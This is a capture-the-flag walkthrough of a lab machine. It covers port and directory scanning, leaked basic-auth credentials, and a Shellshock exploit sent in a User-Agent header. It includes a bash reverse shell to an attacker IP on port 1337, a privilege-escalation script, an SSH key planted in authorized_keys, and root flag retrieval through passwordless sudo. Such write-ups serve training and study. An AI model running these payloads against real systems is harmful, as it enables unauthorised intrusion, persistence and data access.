## Web Hacking 05
> Explore and discover possible vulnerabilities of the machine to gain access and capture the Flag.
> 
> IP: 192.168.10.8

### Nmap
Since the challenge is not showing a port, we first do a port scan using nmap.

```bash
$ nmap -p- 192.168.10.8

Nmap scan report for 192.168.10.8
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8110/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 46.49 seconds
```

The webserver on port 8110 requires authentication and sends a header containing the admin data.


```bash
$ curl -I http://192.168.10.8:8110
HTTP/1.1 401 Unauthorized
Date: Mon, 06 Jun 2022 19:43:42 GMT
Content-Type: text/html
Content-Length: 172
Connection: keep-alive
WWW-Authenticate: Basic realm="Registry realm"
Server: admin : PmFKFzNUzlITtN5mEVr1n9mEx0COWRjc

$ curl http://192.168.10.8:8110 -u admin:PmFKFzNUzlITtN5mEVr1n9mEx0COWRjc
<html>
    <head><title>Vulnerables | ShellShock</title></head>
    <style>
   	.fig {
    	text-align: center;
   	}
   	body {
  	background-color: #0a0a0a;
	}
  </style>
    <body>
    	<p class="fig"><img src="webpage-img.jpg" alt="Here's nothing. "></p>
    </body>
</html>

```

The title says `Vulnerables | ShellShock` and an image showing shellshock.
Since shellshock is a vulnerability in bash execution, we need a `/cgi-bin/` file. To find it, gobuster is used.

```bash
$ gobuster dir -u http://192.168.10.8:8110 -w /usr/share/wordlists/dirb/common.txt -U admin -P PmFKFzNUzlITtN5mEVr1n9mEx0COWRjc
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.8:8110
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Auth User:               admin
[+] Timeout:                 10s
===============================================================
2022/06/06 22:11:05 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 286]
/.htaccess            (Status: 403) [Size: 286]
/cgi-bin/             (Status: 403) [Size: 285]
/index.html           (Status: 200) [Size: 279]
/index                (Status: 200) [Size: 279]
/robots               (Status: 200) [Size: 202]
/robots.txt           (Status: 200) [Size: 202]
/server-status        (Status: 403) [Size: 290]
                                               
===============================================================
2022/06/06 22:12:20 Finished
===============================================================
```

The `robots.txt` shows a hint that this machine is vulnerable and contains a link to `/cgi-bin/vulnerable`.


```bash
$ curl http://192.168.10.8:$PORT/robots.txt -u $AUTH                    

/cgi-bin/vulnerable

This machine appears to be vulnerable to Shellshock, try to obtain a reverse shell.
```

Using the shellshock exploit and `id` as the command, the vulnerability can be detected.


```bash
$ curl -A "() { :;}; echo; /bin/bash -c 'id'" http://192.168.10.8:$PORT/cgi-bin/vulnerable -u $AUTH
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Reverse shell
With a reverse shell opened on the attacker machine using `nc -lvp 1337` and a bash reverse shell through the vulnerability, a shell can be obtained.

In the home folder is a script called `touchmenot.sh` which executes a bash shell as the user `joaquim`.

```bash
$ curl -A "() { :;}; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.9.2/1337 0>&1'" http://192.168.10.8:8110/cgi-bin/vulnerable -u admin:PmFKFzNUzlITtN5mEVr1n9mEx0COWRjc

www-data@01557ef5aa3b:/usr/lib/cgi-bin$ cd /home
www-data@01557ef5aa3b:/home$ ./touchmenot.sh
$ id
uid=33(www-data) gid=33(www-data) euid=1000(joaquim) egid=1000(joaquim) groups=1000(joaquim),33(www-data)

$ cd /home/joaquim

$ ls -lah
total 28K
drwxr-xr-x 1 joaquim joaquim 4.0K May 21 11:21 .
drwxr-xr-x 1 root    root    4.0K May 21 11:21 ..
-rw-r--r-- 1 joaquim joaquim  220 Sep 25  2014 .bash_logout
-rw-r--r-- 1 joaquim joaquim 3.4K Sep 25  2014 .bashrc
-rw-r--r-- 1 joaquim joaquim  675 Sep 25  2014 .profile
drwx------ 2 joaquim joaquim 4.0K May 21 11:21 .ssh
-rw------- 1 joaquim joaquim  341 May 21 11:21 ssh_config.txt

$ cat ssh_config.txt
SSH server is running on a deprecated version.

In order to establish an ssh connection, we need to use ED25519 algorithm.

Create a key with the following command and then paste it on the .ssh/authorized_keys file.

ssh-keygen -t ed25519 -C "your_email@example.com"

To access the server, execute the following command:

ssh -i key user@ip
```

In the home folder of `joaquim` there is a `ssh_config.txt` file containing information on how to create a ssh key.

```bash
$ ssh-keygen -t ed25519 -C "your_email@example.com"
$ cat key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJe+bjgEz9hKqWcFT6bX8bfppr1aTM5zC46oQ/M9Yzd9 your_email@example.com
```

The key is created on the attacker machine and added to the `authorized_keys` file for the user. Now a ssh connection can be used insted of the reverse shell.

```bash
$ cd .ssh
$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJe+bjgEz9hKqWcFT6bX8bfppr1aTM5zC46oQ/M9Yzd9 your_email@example.com" >> authorized_keys
$ cat authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQSZDrYvsA+71Dsj52F8d5/qBsURESHx8e++XPigszh test@example.com
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJe+bjgEz9hKqWcFT6bX8bfppr1aTM5zC46oQ/M9Yzd9 your_email@example.com
```


Since the user is in the sudo group and is not requesting a password, the flag can be retrieved from the `/root/` folder.
```bash
$ ssh -i key joaquim@192.168.10.8


$ sudo ls -lah /root
total 20K
drwx------ 1 root root 4.0K May 21 11:21 .
drwxr-xr-x 1 root root 4.0K Jun  6 07:15 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
-rw-r--r-- 1 root root  140 Nov 19  2007 .profile
-rw-rw-r-- 1 root root   28 May 21 11:14 flag.zip

$ sudo file /root/flag.zip
/root/flag.zip: ASCII text, with no line terminators

$ sudo cat /root/flag.zip 
Y3liZXJjdGZkezFfNG1fcjAwN30=

$ sudo cat /root/flag.zip | base64 -d
cyberctfd{1_4m_r007}
```

The file is base64 encoded, decoded is the searched flag.